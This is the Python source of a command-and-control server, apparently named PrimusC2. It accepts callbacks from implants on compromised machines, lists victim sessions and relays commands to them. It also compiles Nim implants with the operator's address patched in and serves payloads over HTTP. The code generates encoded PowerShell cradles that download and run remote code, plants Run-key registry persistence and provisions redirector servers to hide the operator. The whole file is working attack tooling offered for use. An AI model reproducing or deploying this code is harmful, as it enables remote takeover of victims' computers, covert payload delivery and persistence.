import socket
import threading
from prettytable import PrettyTable
import time 
from datetime import datetime
import string, random, os
import os.path
import shutil
import subprocess
import fcntl
import struct
from http.server import HTTPServer, SimpleHTTPRequestHandler
import http.server
import base64
import randomname
from Cryptodome.PublicKey import RSA
import re
import atexit
from rich import print
from rich.progress import track

def banner():
    print('╔═╗┬─┐┬┌┬┐┬ ┬┌─┐  ╔═╗2')
    print('╠═╝├┬┘│││││ │└─┐  ║  By Oliver Albertsen')
    print('╩  ┴└─┴┴ ┴└─┘└─┘  ╚═╝')


def help():
    print('''
    ------------------------------------------------------------------------------------------------------
    Menu Commands
    ------------------------------------------------------------------------------------------------------
    listeners -g                --> Generate a new listener on desired interface
    nimplant                    --> Generate a compiled exe payload written in nim with advanced capabilities for windows
    sessions -l                 --> List callbacks
    sessions -i <sessions_val>  --> Enter a callback session
    use <sessions_val>          --> Enter a callback session
    pwsh_cradle                 --> Generate a pwsh cradle for a payload on the payloads server
    kill <sessions_val>         --> Terminate active callback
    exit                        --> exit from the server

    Session Commands
    ------------------------------------------------------------------------------------------------------
    background                  --> Backgrounds current sessions
    exit                        --> Terminate current session
    GetAV                       --> Get the current AV running
    pwsh <COMMAND>              --> Load CLR and run powershell in unmanged runspace 
    ''')


def listener_handler(): # Function to handle incoming connections and send bytes over the socket
    try:
        sock.bind((host_ip, int(host_port)))
    except (OSError):
        print(f'[-] Adress already in use, please try another one')
    if listen_choice == "3":
        print(f'[*] Awaiting callback from implants on {re_ip_str}:{host_port} ')
    else:
        print(f'[*] Awaiting callback from implants on {host_ip}:{host_port}')
    
    sock.listen()
    t1 = threading.Thread(target=comm_handler)
    t1.daemon = True
    t1.start()
    

    

def comm_in(target_id):
    print(f'[*] Awaiting response...')
    response = target_id.recv(4096).decode()
    response = base64.b64decode(response)
    response = response.decode().strip()
    return response

def comm_out(target_id, message):
    message = str(message + '\n')
    target_id.send(message.encode())
    
    

    

def kill_signal(target_id, message):
    message = str(message)
    target_id.send(message.encode())

def target_comm(target_id, targets, num):
    while True:
        message = input(f'{targets[num][3]}/{targets[num][1]}#> ') + '\n'
        if len(message) == 0:
            continue
        if message == 'help':
            help()
            
        else:
            comm_out(target_id, message)
            if message == 'exit\n':
                target_id.send(message.encode())
                target_id.close()
                targets[num][7] = 'Dead'
                break
            if message == 'background\n':
                break

            if message == 'help\n':
                help()
           
            if message == 'persist\n':
                payload_n = input('[*] Enter the name of the payload to add to persist: ')
                if targets[num] [6] == 1:
                    ran_name = randomname.get_name()
                    persist1 = f'copy {payload_n} C:\\Users\\Public'
                    comm_out(target_id, persist1) 
                    persist2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v {ran_name} /t REG_SZ /d C:\\Users\Public\\{payload_n}'
                    comm_out(target_id, persist2)
                    print(f'[*] Run the following command to cleanup the registry key: \nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v {ran_name} /f')
                    print('[+] The persistance technique has completed')
             
            if message == 'GetAV':
                pass
                
            else:
                response = comm_in(target_id)
                if response == 'exit':
                    print('[-] The client has terminated the session')
                    target_id.close()
                    break
                print(response)


def comm_handler():
    while True:
        if kill_flag == 1:
            break
        try:
            remote_target, remote_ip = sock.accept()
            username = remote_target.recv(4096).decode()
            username = base64.b64decode(username).decode()
            admin = remote_target.recv(4096).decode()
            admin = base64.b64decode(admin).decode()
            operating_system = remote_target.recv(4096).decode()
            operating_system = base64.b64decode(operating_system).decode()
            host_name = remote_target.recv(4096).decode()
            host_name = base64.b64decode(host_name).decode()
            public_ip = remote_target.recv(4096).decode()
            public_ip = base64.b64decode(public_ip).decode()
            if admin == 1:
                admin_value = 'Yes'
            elif username == 'root':
                admin_value = 'Yes'
            else:
                admin_value = 'No'
            if 'windows' in operating_system:
                pay_val = 1
            else:
                pay_val = 2
            cur_time = time.strftime("%H:%M:%S",time.localtime())
            date = datetime.now()
            time_record = (f'{date.day}/{date.month}/{date.year} {cur_time}')
            
            if host_name is not None:
                targets.append([remote_target, f"{host_name}@{public_ip}", time_record, username, admin_value, operating_system, pay_val,'Active']) #Appending info to targets list
                print(f'[+] Callback recieved from {host_name}@{public_ip}\n' + 'Enter command#> ', end="")
            else: 
                targets.append([remote_target, remote_ip[0], time_record, username, admin_value, operating_system, 'Active'])
                print(f'[+] Callback recieved from {remote_ip[0]}\n' + 'Enter command#> ', end="")  
        except:
            pass



def nimplant():
    global host_ip
    global host_port
    random_name = randomname.get_name()
    compile_name = (''.join(random.choices(string.ascii_lowercase, k=7)))
    f_name= f'{compile_name}.nim'
    exe_file = f'{random_name}.exe'
    file_loc = os.path.expanduser('~/PrimusC2/implant/implant.nim')
    implant_loc = os.path.expanduser('~/PrimusC2/C2/Generated_Implants')
    if os.path.exists(file_loc):
        shutil.copy(file_loc, f_name)
        shutil.move(f_name, implant_loc)
    else:
        print(f'[-] implant.nim not found in {file_loc}')
    print('[*] Use listener address or specify other IP for implant to connect to: ')
    print('[*] 1. Listener adress')
    print('[*] 2. Other IP')
    imp_choice = input('[*] Enter 1 or 2: ')
    if imp_choice == "1":
        pass
    else:
        host_ip = input('[*] Specify IP: ')
    with open(f'{implant_loc}/{f_name}') as f:
        patch_host = f.read().replace('INPUT_IP', str(host_ip.strip()))
    with open(f'{implant_loc}/{f_name}', 'w') as f:
        f.write(patch_host)
        f.close()
    with open(f'{implant_loc}/{f_name}') as f:
        patch_port = f.read().replace('INPUT_PORT', str(host_port))
    with open(f'{implant_loc}/{f_name}', 'w') as f:
        f.write(patch_port)
        f.close()
    compile_cmd = [f"nim", "c", "-d:mingw", "-d:release", "--app:gui", "-d:strip", "--cpu:amd64",f"-o:{implant_loc}/{exe_file}", f"{implant_loc}/{f_name}"]
    for _ in track(range(8), description=f'[green][*] Compiling executeable {exe_file}...'):
        process = subprocess.Popen(compile_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        process.wait()
    implant_loc = os.path.join(implant_loc, exe_file)
    if os.path.exists(implant_loc):
        print(f'[+] {exe_file} saved to {implant_loc}')   
    else:
        print('[-] An error occurred while compiling the implant')
    implant_loc = os.path.expanduser('~/PrimusC2/C2/Generated_Implants')
    os.remove(f'{implant_loc}/{f_name}')
def resolve_ip(interface):
    
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(), 0x8915,  # SIOCGIFADDR
        struct.pack('256s', interface[:15].encode('utf-8'))
        )[20:24])
    
        

def pwsh_cradle():
    try:
        payload_name = input('[*] Input payload name for transfer: ')
        check_file_loc = os.path.expanduser(f'~/PrimusC2/C2/Payloads/{payload_name}')
        
        if os.path.exists(check_file_loc):
            runner_file = (''.join(random.choices(string.ascii_lowercase, k=8)))
            runner_file = f'{runner_file}.exe'
            random_exe = (''.join(random.choices(string.ascii_lowercase, k=6)))
            random_exe = f'{random_exe}.exe'
            payload_loc = os.path.expanduser('~/PrimusC2/C2/Payloads')
            print(f'[*] Payload server available at {host_ip}:8999')
            runner_cal_unencoded = f"iex (new-object net.webclient).downloadstring('http://{host_ip}:8999/Payloads/{runner_file}')".encode('utf-16le')
            with open(runner_file, 'w') as f:
                f.write(f'powershell -c wget http://{host_ip}:8999/Payloads/{payload_name} -outfile {random_exe};Start-Process -FilePath {random_exe} ')
                f.close()
                shutil.move(runner_file, payload_loc)
            b64_runner = base64.b64encode(runner_cal_unencoded)
            b64_runner = b64_runner.decode()
            print(f'\n[+] B64 encoded payload\n\npowershell -e {b64_runner}')
            b64_runner_decoded = base64.b64decode(b64_runner).decode()
            print(f'\n[+] Unencoded payload\n\n{b64_runner_decoded}')
        else:
            print(f'[-] {check_file_loc} does not exist in payloads folder... Try another payload ')
    except(NameError):
        print(f'[*] Payload server not running yet.. start listener: <listener -g>')

def web_payload_server():
    
    http_handler = SimpleHTTPRequestHandler
    http_handler.log_message = lambda *args, **kwargs: None
    http_handler.tr
    server = http.server.ThreadingHTTPServer((host_ip, 8999), http_handler)
    
    print(f'[+] Payload server is running at http://{host_ip}:8999')
    thread = threading.Thread(target = server.serve_forever)
    thread.daemon = True
    thread.start()
    

def redirector(LPORT):
    key_loc = os.path.expanduser('~/.ssh/id_rsa')
    if os.path.exists(key_loc):
        print('[+] Keypair already present...')
    else:
        print('[*] Generating SSH keypair...')
        key = RSA.generate(2048)
        public_key = key.publickey().export_key("PEM")
        private_key = key.exportKey("PEM")
        shutil.move(public_key, key_loc)
        shutil.move(private_key, key_loc)

    
    terra_loc = os.path.expanduser('~/PrimusC2/Terraform')
    redir_loc = os.path.expanduser('~/PrimusC2/Templates/redirector_template.tf')
    copy_loc = os.path.expanduser('~/PrimusC2/Terraform/redirector.tf')
    redirector_name = "redirector.tf"
    if os.path.exists(redir_loc):
        shutil.copy(redir_loc, copy_loc)
        print('[*] Patching listening port...')
        with open(f'{terra_loc}/{redirector_name}') as f:
            patch_host = f.read().replace('LPORT', str(LPORT))
        with open(f'{terra_loc}/{redirector_name}', 'w') as f:
            f.write(patch_host)
            f.close()
            print('[+] Listening port patched\n')
    
    print('[*] Provisioning and configuring redirector... This will take a couple minutes')
    os.chdir(terra_loc)
    os.system("terraform init")
    terra_cmd = ["terraform", "apply", "-auto-approve"]
    process = subprocess.Popen(terra_cmd, stdout=subprocess.PIPE)
    output = process.stdout.read()
    redir_ip = re.findall(r'\b0mdroplet_ip_address \= \"(\d+\.\d+\.\d+.\d+)', output.decode('utf-8'))
    global re_ip_str
    re_ip_str = "".join(redir_ip)
    process.wait()


    print('[*] Running socat realy trough SSH.. wait a moment.')
    subprocess.run(["ssh", f"root@{re_ip_str}", "/tmp/script.sh"],
        shell=False,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        check=False)
    print('[+] Socat relay configured...')
    print('[*] Setting up reverse port forward on localhost]')
    os.system(f"ssh -N -R 4567:localhost:{host_port} root@{re_ip_str} &")

   
def exit_handler():
    print('[*] Destroying redirector infrastructure...')
    terra_loc = os.path.expanduser('~/PrimusC2/Terraform')
    os.chdir(terra_loc)
    os.system("terraform destroy -auto-approve")

    try:
        print('[*] Cleaning up files...')
        os.remove("redirector.tf")
    except:
        print('[-] File not found.')

if __name__ == '__main__':
    targets = [] #store each socket connection
    listener_count = 0
    banner()
    kill_flag = 0
    global host_ip
    global host_port
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    if not os.path.exists('Generated_Implants'):
            print("[+] Creating Generated Implants Directory...")
            os.mkdir('Generated_Implants')
    if not os.path.exists('Payloads'):
            print("[+] Creating Payloads Directory...")
            os.mkdir('Payloads')
    

    while True:
        try:
            command = input('Enter command#>')
            if command == 'help':
                help()
            if command == 'listeners -g':
                print('[*] 1. Interface')
                print('[*] 2. IP-Address')
                print('[*] 3. Listener with redirector\n ')
                listen_choice = (input('[*] Choose an option: '))
                
                if listen_choice == '1':
                    while True:
                        try:
                            host_ip = resolve_ip(input('[*] Enter the interface to listen on: '))
                            host_port = int(input('[*] Enter listening port: '))
                            break  # exit the loop if no exception was raised
                        except (OSError, ValueError, TypeError):
                            print('[-] No such Interface or port... Please try again')
                elif listen_choice == 2:
                    
                    while True:
                        try:
                            host_ip = input('[*] Enter the IP to listen on: ')
                            host_port = int(input('[*] Enter listening port: '))
                            break  # exit the loop if no exception was raised
                        except (OSError, ValueError, TypeError):
                            print('[-] No such IP or port... Please try again')
                elif listen_choice == '3':
                    host_ip = resolve_ip("lo")
                    host_port = int(input('[*] Enter listening port: '))
                    redirector(host_port)
                
                listener_handler()
                listener_count +=1
                web_payload_server()
            elif command == 'nimplant':
                if listener_count > 0:
                    nimplant()
                else:
                    print('[-] Cannot compile payload without active listener')
            if command == 'pwsh_cradle':
                pwsh_cradle()

            if command.split(" ")[0] == 'kill':
                try:
                    num = int(command.split(" ")[1])
                    target_id = (targets[num][0])
                    if targets[num][7] == 'Active':
                        kill_signal(target_id, 'exit')
                        targets[num][7] = 'Dead'
                        print(f'[-] Session {num} terminated')
                    else:
                        print('[-] Cannot interact with a dead session')
                except(IndexError, ValueError, NameError):
                    try:
                        print(f'Session {num} does not exist')
                    except NameError:
                        print('[-] no active sessions to kill')
            
            try:
                if command.split(" ")[0] == 'sessions':
                    session_counter = 0
                    if command.split(" ")[1] == '-l':
                        session_table = PrettyTable()
                        session_table.field_names = ['Session','Username', 'Admin' ,'Status' ,'Target','Operating System','Check-in Time']
                        session_table.padding_width = 3
                        for target in targets:
                            session_table.add_row([session_counter, target[3],target[4],target[7], target[1], target[5],target[2]])
                            session_counter += 1
                        print(session_table)
                    if command.split(" ")[1] == '-i':
                        try:
                            num = int(command.split(" ")[2])
                            target_id = (targets[num])[0]
                            if (targets[num])[7] == 'Active':
                                target_comm(target_id, targets, num)
                            else: 
                                print('[-] Can not interact with Dead implant')
                        except IndexError:
                            try:
                                print(f'[-] Session {num} does not exist')
                            except(NameError):
                                print('[-] Please provide a session to interact with..')
            except(IndexError):
                print('[*] Please providea flag.. eg <-l> or <-i>')
            if command.split(" ")[0] == 'use':
                try:
                    num = int(command.split(" ")[1])
                    target_id = (targets[num])[0]
                    if (targets[num])[7] == 'Active':
                        target_comm(target_id, targets, num)
                    else: 
                        print('[-] Can not interact with Dead implant')
                except (IndexError, TypeError):
                    print(f'[-] Session {num } does not exist' )
                    
            if command == 'exit':
                quit_message = input('Ctrl-C\n[+] Do you really want to quit ? (y/n)').lower()
                if quit_message == 'y':
                    target_length = len(targets)
                    for target in targets:
                        if target[7] == 'Dead':
                            pass
                        else:
                            comm_out(target[0], 'exit')
                    kill_flag = 1
                    if listener_count > 0:
                        sock.close()
                    break
                else:
                    continue
        except KeyboardInterrupt:
            quit_message = input('Ctrl-C\n[+] Do you really want to quit ? (y/n)').lower()
            if quit_message == 'y':
                target_length = len(targets)
                for target in targets:
                    if target[7] == 'Dead':
                        pass
                    else:
                        comm_out(target[0], 'exit')
                kill_flag = 1
                if listener_count > 0:
                    sock.close()
                break
            else:
                continue
atexit.register(exit_handler)